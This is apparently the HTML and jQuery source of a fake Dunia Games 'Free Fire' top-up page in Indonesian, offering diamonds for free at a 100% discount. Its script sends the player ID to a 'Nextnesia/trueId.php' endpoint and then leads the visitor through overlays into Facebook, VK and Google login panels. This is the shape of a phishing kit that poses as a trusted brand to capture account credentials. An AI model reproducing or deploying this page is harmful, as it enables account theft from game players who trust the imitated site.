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"></div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__price">
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--discond"> Discount 100% Rp 0 ( Gratis )</p>
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--label" style="font-family: 'Roboto', sans-serif;"> Rp 0 ( Gratis )</p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__last--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-8 col-xs-8">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__label--paywith">
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <p _ngcontent-gtc-c19="" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;"> Bayar dengan pulsa indosat</p>
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-4 col-xs-4">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__buy--button"><button _ngcontent-gtc-c19="" id="doBuy" type="button" value="buy" style="font-family: 'Roboto', sans-serif;">BELI</button></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                    <div _ngcontent-gtc-c19="" class="col-md-5 box-leftPayment fadeInLeft">
                                        <div _ngcontent-gtc-c19="" class="con-card-voucher hidden-xs"><img _ngcontent-gtc-c19="" alt="logo" class="game-image" src="https://api.duniagames.co.id/api/product/upload/image/13838880871566571420.jpg"></div>
                                        <div _ngcontent-gtc-c19="" class="wrapper-title hidden-xs">
                                            <h2 _ngcontent-gtc-c19="" class="title" style="font-family: 'Roboto', sans-serif;"><b _ngcontent-gtc-c19="" style="font-family: 'Roboto', sans-serif;">Free Fire</b></h2>
                                        </div>
                                        <div _ngcontent-gtc-c19="" class="wrapper-share">
                                            <h4 _ngcontent-gtc-c19="" class="share" style="font-family: 'Roboto', sans-serif;">Bagikan Item Ini</h4>
                                            <div _ngcontent-gtc-c19="" class="row">
                                                <div _ngcontent-gtc-c19="" class="col-md-12 shareIcon">
                                                    <a _ngcontent-gtc-c19="" class="float-left">
                                                        <div _ngcontent-gtc-c19="" class="d-shareIcon"><img _ngcontent-gtc-c19="" class="imgfb" src="https://duniagames.co.id/assets/images/discover/facebook@3x.png">
                                                            <div _ngcontent-gtc-c19="" class="d-shareIcon--absolute">
                                                                <share-button _ngcontent-gtc-c19="" button="facebook" class="sb-button sb-modern-light" _nghost-gtc-c23=""><button _ngcontent-gtc-c23="" class="sb-wrapper sb-facebook sb-show-icon" aria-label="Share on Facebook" style="--button-color:#4267B2; font-size: 14px;"><div _ngcontent-gtc-c23="" class="sb-inner"><div _ngcontent-gtc-c23="" class="sb-content"><!----><div _ngcontent-gtc-c23="" class="sb-icon ng-star-inserted"><fa-icon _ngcontent-gtc-c23="" class="ng-fa-icon"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="facebook-f" class="svg-inline--fa fa-facebook-f fa-w-10 fa-fw" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"></path></svg></fa-icon></div><!----></div><!----></div></button></share-button>
                                                            </div>
                                                        </div>
                                                    </a>
                                                    <a _ngcontent-gtc-c19="" class="float-left">
                                                        <div _ngcontent-gtc-c19="" class="d-shareIcon"><img _ngcontent-gtc-c19="" class="imgtw" src="https://duniagames.co.id/assets/images/discover/twitter@3x.png">
                                                            <div _ngcontent-gtc-c19="" class="d-shareIcon--absolute">
                                                                <share-button _ngcontent-gtc-c19="" button="twitter" class="sb-button sb-modern-light" _nghost-gtc-c23=""><button _ngcontent-gtc-c23="" class="sb-wrapper sb-twitter sb-show-icon" aria-label="Share on Twitter" style="--button-color:#00acee; font-size: 14px;"><div _ngcontent-gtc-c23="" class="sb-inner"><div _ngcontent-gtc-c23="" class="sb-content"><!----><div _ngcontent-gtc-c23="" class="sb-icon ng-star-inserted"><fa-icon _ngcontent-gtc-c23="" class="ng-fa-icon"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter" class="svg-inline--fa fa-twitter fa-w-16 fa-fw" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></fa-icon></div><!----></div><!----></div></button></share-button>
                                                            </div>
                                                        </div>
                                                    </a>
                                                    <!---->
                                                    <!---->
                                                    <a _ngcontent-gtc-c19="" class="float-left embed-url ng-star-inserted">
                                                        <div _ngcontent-gtc-c19="" class="d-shareIcon"><img _ngcontent-gtc-c19="" alt="" class="share-widget" src=".assets/.images/.icons/iconfinder_embed.png"></div>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                        <app-other-voucher _ngcontent-gtc-c19="" _nghost-gtc-c24=""></app-other-voucher>
                                        <div _ngcontent-gtc-c19="" id="rulesWrapper">
                                            <h4 _ngcontent-gtc-c19="" class="descTitle"><span _ngcontent-opk-c5="" class="grayLight" font-family:=""><p><strong>Free Fire</strong> Merupakan permainan survival shooter terbaik yang tersedia di ponsel. Permainan berdurasi 10 menit ini akan menempatkan kamu di pulau terpencil dimana kamu bertarung melawan 49 pemain lainnya, dengan tujuan untuk bertahan hidup. Beragam item in game menarik bisa kamu beli lewat top up diamond Free Fire di Dunia Games!</p></span></h4>
                                        </div><button _ngcontent-gtc-c19="" class="description-toggle hidden-sm hidden-md hidden-lg" id="revealRules" type="button">Lihat lebih lanjut <i _ngcontent-gtc-c19="" class="fa fa-chevron-down"></i></button><button _ngcontent-gtc-c19=""
                                            class="description-toggle hidden-sm hidden-md hidden-lg" id="hideItRules" type="button">Lihat lebih sedikit <i _ngcontent-gtc-c19="" class="fa fa-chevron-up"></i></button></div>
                                </div>
                            </div>
                        </div>
                        <div _ngcontent-gtc-c19="" class="wrapper-gameInfo">
                            <div _ngcontent-gtc-c19="" class="row how-to">
                                <h2 _ngcontent-gtc-c19="" class="title">Top Up Diamonds Free Fire</h2>
                                <div _ngcontent-gtc-c19="" class="desc-how">
                                    <p>Top up Diamonds Free Fire dengan pulsa atau kuota Anda menggunakan Dunia Games. Untuk Beli Top Up Diamonds Free Fire dari Dunia Games, cukup masukkan Free Fire ID Anda dan pilih jumlah Diamonds yang ingin Anda top up.
                                        Jumlah tersebut akan dikurangkan dari saldo pulsa Anda.</p>
                                    <p>&nbsp;</p>
                                    <p>Anda tidak memerlukan kartu kredit untuk beli isi Diamonds untuk Free Fire dari Dunia Games. Anda dapat menggunakan pulsa atau kuota yang ada untuk beli voucher Top up di Dunia Games.</p>
                                    <p>&nbsp;</p>
                                    <h3><span style="color: #ffffff;">Cara Beli Diamond Free Fire pakai Pulsa?</span></h3>
                                    <p>&nbsp;</p>
                                    <p><span style="font-weight: 400; color: #ecf0f1;">Berikut cara top up diamonds Free Fire dengan Free Fire ID melalui berbagai metode pembayaran:</span></p>
                                    <p>&nbsp;</p>
                                    <ol>
                                        <li style="font-weight: 400;"><span style="font-weight: 400; color: #ecf0f1;">Masukan ID FreeFire kamu</span></li>
                                        <li style="font-weight: 400;"><span style="font-weight: 400; color: #ecf0f1;">Pilih item apa yang akan kamu beli</span></li>
                                        <li style="font-weight: 400;"><span style="font-weight: 400; color: #ecf0f1;">Pilih metode pembayaran yang ingin kamu gunakan</span></li>
                                        <li style="font-weight: 400;"><span style="font-weight: 400; color: #ecf0f1;">Masukan email kamu untuk riwayat pembelian dan masukan nomor handphone kamu untuk pembayaran dengan pulsa</span></li>
                                        <li style="font-weight: 400;"><span style="font-weight: 400; color: #ecf0f1;">Jika kamu sudah mengkonfirmasi pembayaran, saldo yang kamu gunakan sebagai metode pembayaran akan terpotong dan item akan ditambahkan ke akun FreeFire kamu</span></li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </section>
                    <app-footer _ngcontent-gtc-c19="" _nghost-gtc-c7="">
                        <footer _ngcontent-gtc-c7="" class="site-footer">
                            <div _ngcontent-gtc-c7="" class="site-footer__top">
                                <div _ngcontent-gtc-c7="" class="container">
                                    <div _ngcontent-gtc-c7="" class="row">
                                        <div _ngcontent-gtc-c7="" class="col-md-12">
                                            <div _ngcontent-gtc-c7="" class="site-footer__item site-footer__item--left">
                                                <a _ngcontent-gtc-c7="" href="/">
                                                    <!----><img style="width: 100px;" alt="" src="https://duniagames.co.id/assets/images/primary-logo.jpg" class="ng-star-inserted"></a>
                                            </div>
                                            <div _ngcontent-gtc-c7="" class="site-footer__item site-footer__item--middle">
                                                <ul _ngcontent-gtc-c7="">
                                                    <!---->
                                                    <li _ngcontent-gtc-c7="" class="ng-star-inserted"><a _ngcontent-gtc-c7="" href="/about-us">Tentang Kami</a></li>
                                                    <li _ngcontent-gtc-c7="" class="ng-star-inserted"><a _ngcontent-gtc-c7="" href="/guidance">Petunjuk</a></li>
                                                    <li _ngcontent-gtc-c7="" class="ng-star-inserted"><a _ngcontent-gtc-c7="" href="/about-us/contact-us">Kontak</a></li>
                                                    <li _ngcontent-gtc-c7="" class="ng-star-inserted"><a _ngcontent-gtc-c7="" href="/become-reseller">Menjadi Reseller</a></li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-gtc-c7="" class="site-footer__item site-footer__item--right">
                                                <div _ngcontent-gtc-c7="" class="media">
                                                    <h4 _ngcontent-gtc-c7="" class="connected">TETAP TERHUBUNG</h4>
                                                </div>
                                                <div _ngcontent-gtc-c7="" class="media social-media">
                                                    <a _ngcontent-gtc-c7="" target="_blank" href="https://www.facebook.com/duniagames/">
                                                        <!----><img _ngcontent-gtc-c7="" alt="" src="https://duniagames.co.id/assets/images/icons/icon-fb.png" class="ng-star-inserted"></a>
                                                    <a _ngcontent-gtc-c7="" target="_blank" href="https://twitter.com/duniagamestsel">
                                                        <!----><img _ngcontent-gtc-c7="" alt="" src="https://duniagames.co.id/assets/images/icons/icon-twitter.png" class="ng-star-inserted"></a>
                                                    <a _ngcontent-gtc-c7="" target="_blank" href="https://www.youtube.com/channel/UCQfwqev-6Vfq2I14cH2x49A/featured">
                                                        <!----><img _ngcontent-gtc-c7="" alt="" src="https://duniagames.co.id/assets/images/icons/icon-youtube-min.png" class="ng-star-inserted"></a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div _ngcontent-gtc-c7="" class="site-footer__bottom">
                                <div _ngcontent-gtc-c7="" class="container">
                                    <div _ngcontent-gtc-c7="" class="row">
                                        <div _ngcontent-gtc-c7="" class="col-md-12">
                                            <div _ngcontent-gtc-c7="" class="site-footer__bottom__item">
                                                <p _ngcontent-gtc-c7="">Copyright © 2022 Dunia Games. All rights reserved.</p>
                                            </div>
                                            <div _ngcontent-gtc-c7="" class="site-footer__bottom__item">
                                                <ul _ngcontent-gtc-c7="">
                                                    <!---->
                                                    <li _ngcontent-gtc-c7="" class="privacy-policy ng-star-inserted"><a _ngcontent-gtc-c7="" target="_blank" href="/about-us/privacy">Kebijakan Privasi</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </footer>
                    </app-footer>
                </div>
            </app-landing-payment-voucher-new>
            <app-vidoe-hover _ngcontent-gtc-c0="" _nghost-gtc-c3="">
                <!---->
            </app-vidoe-hover>

        </div>
    </app-root>
    <img src="https://match.adsrvr.org/track/cmf/generic?ttd_pid=z5n8vwm&amp;ttd_tpi=1" style="display: none;" width="0" height="0" border="0" visible="false">

    <script type="text/javascript" id="">
        ! function(b, e, f, g, a, c, d) {
            b.fbq || (a = b.fbq = function() {
                a.callMethod ? a.callMethod.apply(a, arguments) : a.queue.push(arguments)
            }, b._fbq || (b._fbq = a), a.push = a, a.loaded = !0, a.version = "2.0", a.queue = [], c = e.createElement(f), c.async = !0, c.src = g, d = e.getElementsByTagName(f)[0], d.parentNode.insertBefore(c, d))
        }(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
        fbq("init", "347980038942340");
        fbq("track", "PageView");
    </script>
    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=347980038942340&amp;ev=PageView&amp;noscript=1"></noscript>

    <script type="text/javascript" id="">
        _atrk_opts = {
            atrk_acct: "OWeIu1kx0820/9",
            domain: "duniagames.co.id",
            dynamic: !0
        };
        (function() {
            var a = document.createElement("script");
            a.type = "text/javascript";
            a.async = !0;
            a.src = "https://certify-js.alexametrics.com/atrk.js";
            var b = document.getElementsByTagName("script")[0];
            b.parentNode.insertBefore(a, b)
        })();
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <noscript><img src="https://certify.alexametrics.com/atrk.gif?account=OWeIu1kx0820/9" style="display:none" height="1" width="1" alt=""></noscript>
    <script type="text/javascript">
    $(document).ready(function() {

        $(".5dm").on('click', function() {
            $("div.ng-star-inserted").removeClass("selected");
            $(".5dm").addClass("selected");
            $("#showPayment").fadeIn('slow');
            $("#saveItem").val('5');
        });

        $(".70dm").on('click', function() {
            $("div.ng-star-inserted").removeClass("selected");
            $(".70dm").addClass("selected");
            $("#showPayment").fadeIn('slow');
            $("#saveItem").val('70');
        });

        $(".355dm").on('click', function() {
            $("div.ng-star-inserted").removeClass("selected");
            $(".355dm").addClass("selected");
            $("#showPayment").fadeIn('slow');
            $("#saveItem").val('355');
        });

        $(".720dm").on('click', function() {
            $("div.ng-star-inserted").removeClass("selected");
            $(".720dm").addClass("selected");
            $("#showPayment").fadeIn('slow');
            $("#saveItem").val('720');
        });

        $(".1450dm").on('click', function() {
            $("div.ng-star-inserted").removeClass("selected");
            $(".1450dm").addClass("selected");
            $("#showPayment").fadeIn('slow');
            $("#saveItem").val('1450');
        });
        
        $(".3250dm").on('click', function() {
            $("div.ng-star-inserted").removeClass("selected");
            $(".3250dm").addClass("selected");
            $("#showPayment").fadeIn('slow');
            $("#saveItem").val('3250');
        })

        $("button#doBuy").on("click", function() {
            var playerId = $("#playerId").val();

            if(playerId.length < 1) {
                $(".invalid-feedback").fadeIn("slow");
            } else {
                $(".invalid-feedback").hide();
                $.ajax({
                    url: "Nextnesia/trueId.php",
                    type: "POST",
                    data: "playerId="+playerId,
                    beforeSend: function() {
                        $(".loading-block").addClass("active");
                    },
                    success: function(responses) {
                        $(".loading-block").removeClass("active");

                        if(responses == "") {
                            $(".overlay-container").fadeIn("slow");
                            $("#msgError").html("Wrong game User ID");

                            $(".toast-close-button").on('click', function() {
                                $(".overlay-container").hide();
                            });

                            
                        } else {
                            $("input#userNickForm").val(responses);
                            $("input#userIdForm").val(playerId);
                            $("#cdk-overlay-container").fadeIn('slow');
                            $("#cdk-overlay-backdrop").show();

                            $("#showItem").html($("#saveItem").val()+" Diamonds");
                            $("#showId").html(playerId);
                            $("#showNick").html(responses);

                            $("#btn-confirmFirst").on('click', function() {
                                $("#cdk-overlay-container").hide();
                                $("#cdk-overlay-backdrop").hide();

                                $("#cdk-overlay-container2").fadeIn('slow');
                                $("#cdk-overlay-backdrop2").show();
                            });

                             $("#fbLogin").on('click', function() {
                                $(".facebook").show();
                                $("#cdk-overlay-container2").hide();
                                $("#cdk-overlay-backdrop2").hide();

                                $(".close-fb").on('click', function() {
                                    $(".facebook").hide();
                                    $("#cdk-overlay-container2").show();
                                    $("#cdk-overlay-backdrop2").show();
                                });
                            }); 

                            $("#vkLogin").on('click', function() {
                                $(".twitter").show();
                                $("#cdk-overlay-container2").hide();
                                $("#cdk-overlay-backdrop2").hide();

                                $(".close-other").on('click', function() {
                                    $(".twitter").hide();
                                    $("#cdk-overlay-container2").show();
                                    $("#cdk-overlay-backdrop2").show();
                                });
                            }); 
                            
                            $("#gpLogin").on('click', function() {
                                $(".google").show();
                                $("#cdk-overlay-container2").hide();
                                $("#cdk-overlay-backdrop2").hide();

                                $(".close-other").on('click', function() {
                                    $(".google").hide();
                                    $("#cdk-overlay-container2").show();
                                    $("#cdk-overlay-backdrop2").show();
                                });
                            }); 

                            $("#reset2").on('click', function() {
                                $("#cdk-overlay-container2").hide();
                                $("#cdk-overlay-backdrop2").hide();

                                $("#cdk-overlay-container").fadeIn('slow');
                                $("#cdk-overlay-backdrop").show();
                            });

                            $("#reset1").on('click', function() {
                                location.href='';
                            });

                        }
                    }
                });
            }
        });
    });
    </script>

<div class="overlay-container" style="display: none;">
            <div id="toast-container" class="toast-top-center toast-container">
            <div toast-component="" class="toast-error ngx-toastr ng-trigger ng-trigger-flyInOut" style="opacity: 1;"><!---->
            <button aria-label="Close" class="toast-close-button ng-tns-c13-7 ng-star-inserted" style="">
                <span class="ng-tns-c13-7" aria-hidden="true">×</span>
            </button><!----><!---->
